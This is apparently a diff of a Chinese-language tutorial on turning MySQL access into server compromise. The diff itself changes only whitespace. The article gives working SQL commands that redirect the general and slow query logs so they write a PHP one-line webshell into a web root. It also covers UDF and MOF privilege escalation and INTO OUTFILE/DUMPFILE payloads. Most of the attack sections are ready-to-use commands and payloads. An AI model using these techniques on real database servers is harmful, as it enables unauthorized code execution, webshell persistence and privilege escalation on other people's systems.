@@ -29,7 +29,7 @@ source: "MrWQ/vulnerability-paper"
 MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell
 
 ```
-`show variables like 'general_log';    查看日志是否开启``set global general_log=on;    开启日志功能``show variables like 'general_log_file';    查看日志文件保存位置``set global general_log_file='D:/phpStudy/WWW/shell.php';    设置日志文件保存位置``show variables like 'log_output';    查看日志输出类型 table或file``set global log_output='table';    设置输出类型为 table``set global log_output='file';    设置输出类型为file``SELECT'<?php assert($_POST["YB666"]);?>';    通过日志来写入一句话`
+`show variables like 'general_log';    查看日志是否开启``set global general_log=on;    开启日志功能``show variables like 'general_log_file';    查看日志文件保存位置``set global general_log_file='D:/phpStudy/WWW/shell.php';    设置日志文件保存位置``show variables like 'log_output';    查看日志输出类型 table或file``set global log_output='table';    设置输出类型为 table``set global log_output='file';    设置输出类型为file``SELECT'<?php assert($_POST["YB666"]);?>';    通过日志来写入一句话`
 ```
 
 ![图片](https://mmbiz.qpic.cn/mmbiz_png/vvO7f1bFAvWaTHu1neiamFqZxqompv2pJNmfTgxBxqzxCTdyUxMbH7SeM2UYvkMickzicWFLocDibXT3ScgTUzqxtg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
@@ -80,7 +80,7 @@ set global general_log_file='D:/phpStudy/WWW/shell.php'; //设置日志文件保
 写入一句话：
 
 ```
-SELECT'<?php assert($_POST["YuBai"]);?>';
+SELECT'<?php assert($_POST["YuBai"]);?>';
 ```
 
 
@@ -118,7 +118,7 @@ show global variables like '%long_query_time%';
 
   
 
-    通常情况下执行sql语句时的执行时间一般不会超过10s，所以说这个日志文件应该是比较小的，而且默认也是禁用状态，不容易引起管理员的察觉。
+    通常情况下执行sql语句时的执行时间一般不会超过10s，所以说这个日志文件应该是比较小的，而且默认也是禁用状态，不容易引起管理员的察觉。
 
 Testing：
 
@@ -129,7 +129,7 @@ Testing：
 查看默认服务器时间等命令
 
 ```
-`set global variables like '%long_query_time%';``show variables like '%slow_query_log%';`
+`set global variables like '%long_query_time%';``show variables like '%slow_query_log%';`
 ```
 
 
@@ -157,11 +157,11 @@ Testing：
 **0x03 UDF提权**
 --------------
 
-    自定义函数，是数据库功能的一种扩展。用户通过自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像调用本机函数 version() 等方便。
+    自定义函数，是数据库功能的一种扩展。用户通过自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像调用本机函数 version() 等方便。
 
 **动态链接库**
 
-    如果是 MySQL >= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib文件夹下文件夹下才能创建自定义函数。
+    如果是 MySQL >= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib文件夹下文件夹下才能创建自定义函数。
 
 那么动态链接库文件去哪里找呢？实际上我们常用的工具sqlmap和Metasploit 里面都自带了对应系统的动态链接库文件。
 
@@ -173,7 +173,7 @@ Testing：
 
 
 
-    sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用sqlmap自带的解码工具cloak.py来解码使用，cloak.py 的位置为：  
+    sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用sqlmap自带的解码工具cloak.py来解码使用，cloak.py 的位置为：  
 
 _**`sqlmap根目录/extra/cloak/cloak.py`**_
 
@@ -287,7 +287,7 @@ drop function sys_eval;
 **0x04 MOF提权**
 --------------
 
-    MOF提权原理 关于 mof 提权的原理其实很简单，就是利用了 c:/windows/system32/wbem/mof/ 目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。
+    MOF提权原理 关于 mof 提权的原理其实很简单，就是利用了 c:/windows/system32/wbem/mof/ 目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。
 
 严苛的前提条件：
 
@@ -300,7 +300,7 @@ drop function sys_eval;
 
 提权过程：
 
-  MOF文件每五秒就会执行，而且是系统权限，我们通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。
+  MOF文件每五秒就会执行，而且是系统权限，我们通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。
 
 利用代码如下（test.mof）：
 
@@ -329,7 +329,7 @@ select load_file("C:/soft/test.mof") into dumpfile "c:/windows/system32/wbem/mof
 
 
 
-    关于MOF提权弊端 我们提权成功后，就算被删号，mof也会在五秒内将原账号重建，那么这给我们退出测试造成了很大的困扰，所以谨慎使用。那么我们如何删掉我们的入侵账号呢？
+    关于MOF提权弊端 我们提权成功后，就算被删号，mof也会在五秒内将原账号重建，那么这给我们退出测试造成了很大的困扰，所以谨慎使用。那么我们如何删掉我们的入侵账号呢？
 
 _**cmd 下运行下面语句:**_
 
@@ -404,7 +404,7 @@ UDF和MOF提权内容收集自作者：Big&Bird
     
 
 ```
-`union select 1,2,3,4,'<?php phpinfo(); ?>' into outfile 'D:/phpStudy/WWW/shell.php'``union select 1,2,3,4,'<?php phpinfo(); ?>' into dumpfile 'D:/phpStudy/WWW/shell.php'`
+`union select 1,2,3,4,'<?php phpinfo(); ?>' into outfile 'D:/phpStudy/WWW/shell.php'``union select 1,2,3,4,'<?php phpinfo(); ?>' into dumpfile 'D:/phpStudy/WWW/shell.php'`
 ```
 
 ```
@@ -455,7 +455,7 @@ UDF和MOF提权内容收集自作者：Big&Bird
 PAYLOAD：
 
 ```
-`into outfile 'D:/phpStudy/WWW/shell.php' lines terminated by '<?php phpinfo(); ?>';``limit 1 into outfile 'D:/phpStudy/WWW/shell.php' lines terminated by '<?php phpinfo(); ?>';`
+`into outfile 'D:/phpStudy/WWW/shell.php' lines terminated by '<?php phpinfo(); ?>';``limit 1 into outfile 'D:/phpStudy/WWW/shell.php' lines terminated by '<?php phpinfo(); ?>';`
 ```
 
 ```
@@ -515,7 +515,7 @@ PAYLOAD：
 
 1.  后台回复发送 "交流群"，即可获取交流群二维码。
     
-2.  如若上述方式不行，请点击联系我们->联系官方添加二维码拉群 。    
+2.  如若上述方式不行，请点击联系我们->联系官方添加二维码拉群 。    
     
 
 
@@ -540,7 +540,7 @@ PAYLOAD：
 
   
 
-          
+          
 
   
 
